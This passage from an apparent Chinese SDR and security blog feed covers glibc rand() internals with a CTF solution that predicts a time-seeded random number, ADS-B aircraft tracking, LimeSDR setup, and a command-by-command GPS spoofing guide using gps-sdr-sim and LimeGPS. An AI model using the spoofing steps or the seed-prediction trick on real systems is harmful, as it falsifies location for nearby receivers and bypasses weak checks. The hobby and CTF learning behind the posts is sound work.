class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  ++rptr;</span><br><span class="line">  <span class="keyword">if</span> (rptr &gt;= end_ptr)</span><br><span class="line">    rptr = state;</span><br><span class="line">&#125;</span><br><span class="line">      buf-&gt;fptr = fptr;</span><br><span class="line">      buf-&gt;rptr = rptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> fail:</span><br><span class="line">  __set_errno (EINVAL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到glibc的实现其中有两种算法，一种是线性同余法LCG（linear congruential generator),一种是additive feedback generator.使用哪个生成器取决于initstate()函数生成的初始状态。</p><h4 id="initstate"><a href="#initstate" class="headerlink" title="initstate()"></a>initstate()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__initstate_r (<span class="keyword">unsigned</span> <span class="keyword">int</span> seed, <span class="keyword">char</span> *arg_state, <span class="keyword">size_t</span> n,</span><br><span class="line">       struct random_data *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (buf == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int32_t</span> *old_state = buf-&gt;state;</span><br><span class="line">  <span class="keyword">if</span> (old_state != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> old_type = buf-&gt;rand_type;</span><br><span class="line">      <span class="keyword">if</span> (old_type == TYPE_0)</span><br><span class="line">old_state[<span class="number">-1</span>] = TYPE_0;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">old_state[<span class="number">-1</span>] = (MAX_TYPES * (buf-&gt;rptr - old_state)) + old_type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> type;</span><br><span class="line">  <span class="keyword">if</span> (n &gt;= BREAK_3)</span><br><span class="line">    type = n &lt; BREAK_4 ? TYPE_3 : TYPE_4;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; BREAK_1)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (n &lt; BREAK_0)</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">      type = TYPE_0;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    type = n &lt; BREAK_2 ? TYPE_1 : TYPE_2;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> degree = random_poly_info.degrees[type];</span><br><span class="line">  <span class="keyword">int</span> separation = random_poly_info.seps[type];</span><br><span class="line"></span><br><span class="line">  buf-&gt;rand_type = type;</span><br><span class="line">  buf-&gt;rand_sep = separation;</span><br><span class="line">  buf-&gt;rand_deg = degree;</span><br><span class="line">  <span class="keyword">int32_t</span> *state = &amp;((<span class="keyword">int32_t</span> *) arg_state)[<span class="number">1</span>];<span class="comment">/* First location.  */</span></span><br><span class="line">  <span class="comment">/* Must set END_PTR before srandom.  */</span></span><br><span class="line">  buf-&gt;end_ptr = &amp;state[degree];</span><br><span class="line"></span><br><span class="line">  buf-&gt;state = state;</span><br><span class="line"></span><br><span class="line">  __srandom_r (seed, buf);</span><br><span class="line"></span><br><span class="line">  state[<span class="number">-1</span>] = TYPE_0;</span><br><span class="line">  <span class="keyword">if</span> (type != TYPE_0)</span><br><span class="line">    state[<span class="number">-1</span>] = (buf-&gt;rptr - state) * MAX_TYPES + type;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> fail:</span><br><span class="line">  __set_errno (EINVAL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LCG生成器只在state size为8个字节的时候使用，当更大时就使用第二种生成器。使用srand()设置种子的时候，默认状态的大小为128字节。</p><h4 id="LCG"><a href="#LCG" class="headerlink" title="LCG"></a>LCG</h4><p>Wiki:<code>https://en.wikipedia.org/wiki/Linear_congruential_generator</code><br>线性同余方法是最知名的伪随机数生成器算法之一，容易理解，易于实现，速度快。但是有一个缺点，当你获得一个伪随机数以后。当前周期不会再获取到这一个数，恰好2……31次调用之后获得这个数，而且只会得到这个数。LAFG生成器就没有这个问题，可以在同一个周期获得多次同一个数。</p><h2 id="实际问题"><a href="#实际问题" class="headerlink" title="实际问题"></a>实际问题</h2><p>今天碰到的一个MISC题通过IDA分析后情况如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx@4</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num; <span class="comment">// [sp+8h] [bp-38h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> N; <span class="comment">// [sp+Ch] [bp-34h]@1</span></span><br><span class="line">  <span class="keyword">time_t</span> seed; <span class="comment">// [sp+10h] [bp-30h]@1</span></span><br><span class="line">  tm *time_info; <span class="comment">// [sp+18h] [bp-28h]@1</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">9</span>]; <span class="comment">// [sp+20h] [bp-20h]@1</span></span><br><span class="line">  __int64 v10; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v10 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  seed = time(<span class="number">0L</span>L);</span><br><span class="line">  srand(seed);</span><br><span class="line">  N = rand() &gt;&gt; <span class="number">8</span>;</span><br><span class="line">  time_info = localtime(&amp;seed);</span><br><span class="line">  strftime(buf, <span class="number">9u</span>LL, <span class="string">"%H:%M:%S"</span>, time_info);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"time: %s\n"</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"plz guess my number:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%u"</span>, &amp;num);</span><br><span class="line">  <span class="keyword">if</span> ( num == N )</span><br><span class="line">    system(<span class="string">"/bin/cat ./flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"sorry,try again!"</span>);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  v4 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v10;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个程序就是通过调用时间设为随机数的种子，生成的数字简单移位，判断生成的随机数与输入的数是否相同，如果相同输出flag.<br>那么我写一个程序同样使用时间作为种子就可以预测它生成的随机数了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> result;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> N;</span><br><span class="line"><span class="keyword">time_t</span> seed;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">time_info</span>;</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">9</span>];</span><br><span class="line">seed = time(<span class="literal">NULL</span>);</span><br><span class="line">srand(seed);</span><br><span class="line">N = rand()&gt;&gt;<span class="number">8</span>;</span><br><span class="line">time_info = localtime(&amp;seed);</span><br><span class="line">strftime(buf,<span class="number">100</span>,<span class="string">"%H:%M:%S\n"</span>,time_info);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"time: %s\n"</span>,buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%u"</span>,N);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rand()会返回的随机数值，srand()用来设置rand()产生随机数时的随机数种子。<br>如果碰到随机种子是使用time()函数生成的情况，就可以考虑同步服务器时间，在某些情况绕过一个验证机制。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>接收ADS-B信号实现追踪飞机轨迹</title>
      <link href="/2018/06/18/%E6%8E%A5%E6%94%B6ADS-B%E4%BF%A1%E5%8F%B7%E5%AE%9E%E7%8E%B0%E8%BF%BD%E8%B8%AA%E9%A3%9E%E6%9C%BA%E8%BD%A8%E8%BF%B9/"/>
      <url>/2018/06/18/%E6%8E%A5%E6%94%B6ADS-B%E4%BF%A1%E5%8F%B7%E5%AE%9E%E7%8E%B0%E8%BF%BD%E8%B8%AA%E9%A3%9E%E6%9C%BA%E8%BD%A8%E8%BF%B9/</url>
      
        <content type="html"><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>本来之前是想用rtl-sdr来实现飞机轨迹的追踪，还没有玩过rtl-sdr,现在有更好的设备当然要试一试了。<br>在通用航空当中ADS-B信号经常在978MHz发射，在商业飞行中ADS-B信号经常在1090MHz发射。<br>有关于ADS-B信号的资料网上有很多，我这里就不写了。<br>环境的安装就不写了，这次需要安装gr-airmodes和google earth.<br>其实如果是hackrf这样的设备可以使用dump1090来搞定，但是貌似现在Limesdr还没有支持。</p><h3 id="gr-air-modes"><a href="#gr-air-modes" class="headerlink" title="gr-air-modes"></a>gr-air-modes</h3><p>下载编译安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/bistromath/gr-air-modes.git</span><br><span class="line">$ cd gr-air-modes</span><br><span class="line">$ mkdir build</span><br><span class="line">$ cd build</span><br><span class="line">$ cmake ../</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line">$ sudo ldconfig</span><br></pre></td></tr></table></figure></p><p>apps/modes_rx: The main application.<br><code>$ modes_rx --help</code></p><h3 id="google-earth"><a href="#google-earth" class="headerlink" title="google earth"></a>google earth</h3><p>这个基本大家都玩过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://dl.google.com/dl/earth/client/current/google-earth-stable_current_amd64.deb</span><br><span class="line">sudo dpkg -i google-earth-stable_current_amd64.deb</span><br></pre></td></tr></table></figure></p><p>根据<code>https://cn0xroot.com/2016/11/17/exploring-the-wireless-world-with-usrp-part-1-aircraft-tracking-with-usrp/</code><br>这篇文章，理论上<code>./modex_rx -K test.kml</code>就完事了。<br>执行App目录下的modex_rx，开始接收并解码来自飞机的1090MHz无线信号，-K参数即把解码到的航班号、经纬度、飞行速度等等保存为.kml文件。<br>但是，我这里就报错了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[INFO] [UHDSoapyDevice] LMS7002M calibration values caching Disable</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;./modes_rx&quot;, line 99, in &lt;module&gt;</span><br><span class="line">    main()</span><br><span class="line">  File &quot;./modes_rx&quot;, line 58, in main</span><br><span class="line">    tb = air_modes.modes_radio(options, context)</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/dist-packages/air_modes/radio.py&quot;, line 47, in __init__</span><br><span class="line">    self._setup_source(options)</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/dist-packages/air_modes/radio.py&quot;, line 179, in _setup_source</span><br><span class="line">    self._u.set_time_now(uhd.time_spec(0.0))</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/dist-packages/gnuradio/uhd/uhd_swig.py&quot;, line 2490, in set_time_now</span><br><span class="line">    return _uhd_swig.usrp_source_sptr_set_time_now(self, *args, **kwargs)</span><br><span class="line">RuntimeError: SoapyLMS7::setHardwareTime() sample rate unset</span><br></pre></td></tr></table></figure></p><p>关于这个报错我还没解决，之后尝试打开modes_gui，发现无法更改Rate。也无法正常运行。GitHub也有人提相同的问题，目前没有人回答。<br>后来我找到了解决办法<br><code>modes_rx --source=osmocom --kel=xxx.kml</code></p><p>打开Google earth，Add-&gt;Network Link-&gt;Link当中把xxx.kml的位置填进去。<br>设定刷新时间，以及是否在刷新时前往该视图。</p><p>等一会就可以在地图上看到显示的航班号了，还可以显示飞行高度。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>天线不行，在室内效果很一般，室外还行。</p><p>一个在线看飞机的网站<br><code>https://zh.flightaware.com/live/</code></p><p>理论上实现这个方法有很多,应该也可以直接采样1090MHz的频段数据,再导入其他软件进行分析.我就不测试了.</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>GPS欺骗的简单实现</title>
      <link href="/2018/06/18/GPS%E6%AC%BA%E9%AA%97%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/"/>
      <url>/2018/06/18/GPS%E6%AC%BA%E9%AA%97%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>之前一直想尝试一下GPS欺骗，主要是没有工具无法实现。现在手头有Limesdr,搜索了一下进行了简单的测试，在我的一个老的安卓手机上测试成功。目前用的iPhone没有欺骗成功，暂时没有研究原因。</p><h3 id="gps-sdr-sim"><a href="#gps-sdr-sim" class="headerlink" title="gps-sdr-sim"></a>gps-sdr-sim</h3><p><code>https://github.com/osqzss/gps-sdr-sim</code><br>这是一个生成GPS信号文件的工具，需要用其他工具将信号文件发射出去。<br>首先下载编译gps-sdr-sim<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/osqzss/gps-sdr-sim.git</span><br><span class="line">cd gps-sdr-sim</span><br><span class="line">gcc gpssim.c -lm -O3 -o gps-sdr-sim</span><br></pre></td></tr></table></figure></p><h3 id="RINEX星历数据"><a href="#RINEX星历数据" class="headerlink" title="RINEX星历数据"></a>RINEX星历数据</h3><p><code>ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily</code><br>比如我下载的是<code>ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily/2018/brdc/brdc1690.18g.Z</code><br>下载之后需要解压。</p><ul><li>RINEX文件命名规则<br>前4位：四字符测站名<br>5-7：年积日<br>8：一天内的文件序号（时段号），0-9，A-Z，若为0，则表示文件包含当天的所有观测数据<br>.1-2:两位年号<br>最后一位：<br>O:观测值<br>N:星历<br>M:气象数据<br>G:GLONASS星历<br>H:同步卫星GPS载荷的导航电文<br>C:钟文件</li></ul><h3 id="LimeGPS"><a href="#LimeGPS" class="headerlink" title="LimeGPS"></a>LimeGPS</h3><p>光生成信号文件不行，要想办法发出去。翻了一些翻到一个工具LimeGPS.<br><code>https://github.com/osqzss/LimeGPS</code><br>安装和测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository -y ppa:myriadrf/drivers</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install limesuite liblimesuite-dev limesuite-udev limesuite-images</span><br><span class="line">$ sudo apt-get install soapysdr soapysdr-module-lms7</span><br><span class="line">$ git clone https://github.com/osqzss/LimeGPS</span><br><span class="line">$ cd LimeGPS</span><br><span class="line">$ make</span><br><span class="line">$ ./LimeGPS -e brdc0350.18n</span><br></pre></td></tr></table></figure></p><p>运行测试之后，理论上来讲不管是否欺骗成功，在手机上是可以看到虚假的GPS卫星信号的。我是通过GPS test软件查看的。<br>如果顺利的话，这里就能够实现GPS欺骗了。<br>动态的GPS轨迹我没有测试。</p><h3 id="gps-sdr-sim-realtime"><a href="#gps-sdr-sim-realtime" class="headerlink" title="gps-sdr-sim-realtime"></a>gps-sdr-sim-realtime</h3><p>之后我看到了这篇文章<code>https://blog.csdn.net/fftt516/article/details/78062054?locationNum=1&amp;fps=1</code><br>他介绍这个项目将gps-sdr-sim产生的数据用socket发送到一个特定的端口，然后在grc钟用TCP来接收这些数据，并通过Osmosdr Sink发射出去。同时实现了基于PyWeb用百度接口实现可视化的地图位置更改。<br><code>git clone https://github.com/gym487/gps-sdr-sim-realtime.git</code><br>打开文件夹可以看到tcp.grc,grc需要运行。<br><code>gnuradio-companion tcp.grc</code><br>需要根据设备修改一下。<br>TCP Source 把端口改成2913<br>osmocom Sink 当中<br>Device Arguments: driver=lime,soapy=0<br>Antenna 设为空</p><p>接下来运行一个本地的http server获取相应的GPS坐标，启动Server。<br><code>cd mapserver</code><br><code>python mapper.py</code><br>浏览器当中输入<br><code>http://127.0.0.1:8080/static/baidumap.html</code><br>就可以点击任何位置，点击之后就会自动更新数据。</p><p><code>./gps-sdr-sim -e brdc1670.18n -n 2913 -v -d 3600 -w</code></p><p>brdc为星历文件，-n TCP server接收方的端口</p><p>信号通过osmosdr sink -&gt; LimeSDR发射出去了</p><p>手机上就可以看到欺骗结果了，我测试虽然成功，但是并不稳定。目前没有时间仔细研究。就记录到这里。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>LimeSDR入手</title>
      <link href="/2018/06/13/LimeSDR%E5%85%A5%E6%89%8B/"/>
      <url>/2018/06/13/LimeSDR%E5%85%A5%E6%89%8B/</url>
      
        <content type="html"><![CDATA[<p>现在手头有一块LimeSDR,那么就开始折腾，本来是根据<code>https://cn0xroot.com/2017/04/12/limesdr-getting-started-quickly/</code>这位大佬的教程去做的，但是中途会出现问题，只好自己找资料入手。</p><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>我就不介绍这块板子了，其实SDR我可能也要继续了解一下写点笔记，现在先记录一下基本的配置。<br>我刚开始是按照上面网址的教程去做的，但是中间会出现问题，是驱动结构发生变化的原因，所以重新开始找配置的方法。<br>最终找到这个结构，按这个配置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HARDWARE |                                SOFTWARE</span><br><span class="line">LimeSDR &lt;-&gt; LimeSuite &lt;-&gt; SoapyLMS7 &lt;-&gt; SoapySDR &lt;-&gt;  SoapyUHD &lt;-&gt; UHD &lt;-&gt; Software using UHD</span><br></pre></td></tr></table></figure></p><h5 id="安装SoapySDR"><a href="#安装SoapySDR" class="headerlink" title="安装SoapySDR"></a>安装SoapySDR</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    cmake g++ \</span><br><span class="line">    libpython-dev python-numpy swig</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pothosware/SoapySDR.git</span><br><span class="line">cd SoapySDR</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make -j4</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig #needed on debian systems</span><br><span class="line">SoapySDRUtil --info</span><br></pre></td></tr></table></figure><h5 id="安装LimeSuite"><a href="#安装LimeSuite" class="headerlink" title="安装LimeSuite"></a>安装LimeSuite</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository -y ppa:myriadrf/drivers</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install limesuite liblimesuite-dev limesuite-udev limesuite-images</span><br><span class="line">sudo apt-get install soapysdr soapysdr-module-lms7</span><br><span class="line">#packages for soapysdr available at myriadrf PPA</span><br><span class="line">sudo add-apt-repository -y ppa:myriadrf/drivers</span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">#install core library and build dependencies</span><br><span class="line">sudo apt-get install git g++ cmake libsqlite3-dev</span><br><span class="line"></span><br><span class="line">#install hardware support dependencies</span><br><span class="line">sudo apt-get install libsoapysdr-dev libi2c-dev libusb-1.0-0-dev</span><br><span class="line"></span><br><span class="line">#install graphics dependencies</span><br><span class="line">sudo apt-get install libwxgtk3.0-dev freeglut3-dev</span><br><span class="line"></span><br><span class="line">git clone https://github.com/myriadrf/LimeSuite.git</span><br><span class="line">cd LimeSuite</span><br><span class="line">mkdir builddir &amp;&amp; cd builddir</span><br><span class="line">cmake ../</span><br><span class="line">make -j4</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br><span class="line">cd LimeSuite/udev-rules</span><br><span class="line">sudo ./install.sh</span><br></pre></td></tr></table></figure><h5 id="安装UHD"><a href="#安装UHD" class="headerlink" title="安装UHD"></a>安装UHD</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libboost-all-dev libusb-1.0-0-dev python-mako doxygen python-docutils cmake build-essential</span><br><span class="line">git clone git://github.com/EttusResearch/uhd.git</span><br><span class="line">cd &lt;uhd-repo-path&gt;/host</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ../</span><br><span class="line">make</span><br><span class="line">make test</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><h5 id="安装SoapyUHD"><a href="#安装SoapyUHD" class="headerlink" title="安装SoapyUHD"></a>安装SoapyUHD</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pothosware/SoapyUHD.git</span><br><span class="line">cd SoapyUHD</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h5 id="安装SDR常用软件"><a href="#安装SDR常用软件" class="headerlink" title="安装SDR常用软件"></a>安装SDR常用软件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install git</span><br><span class="line">sudo apt-get install python-pip</span><br><span class="line"></span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install git+https://github.com/gnuradio/pybombs.git</span><br><span class="line"></span><br><span class="line">pybombs recipes add gr-recipes git+https://github.com/gnuradio/gr-recipes.git </span><br><span class="line">pybombs recipes add gr-etcetera git+https://github.com/gnuradio/gr-etcetera.git</span><br><span class="line"></span><br><span class="line">pybombs prefix init /usr/local -a myprefix -R gnuradio-default</span><br><span class="line">pybombs install gqrx gr-osmosdr</span><br></pre></td></tr></table></figure><h5 id="使用gqrx的小问题"><a href="#使用gqrx的小问题" class="headerlink" title="使用gqrx的小问题"></a>使用gqrx的小问题</h5><p>开启的时候<br>using the “other” setting with “driver=lime,soapy=0”<br>天线选择一下就可以收到FM了，但是声音很小不知道是哪里的问题。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>AWUS036ACH网卡驱动问题</title>
      <link href="/2018/06/11/AWUS036ACH%E7%BD%91%E5%8D%A1%E9%A9%B1%E5%8A%A8%E9%97%AE%E9%A2%98/"/>
      <url>/2018/06/11/AWUS036ACH%E7%BD%91%E5%8D%A1%E9%A9%B1%E5%8A%A8%E9%97%AE%E9%A2%98/</url>
      
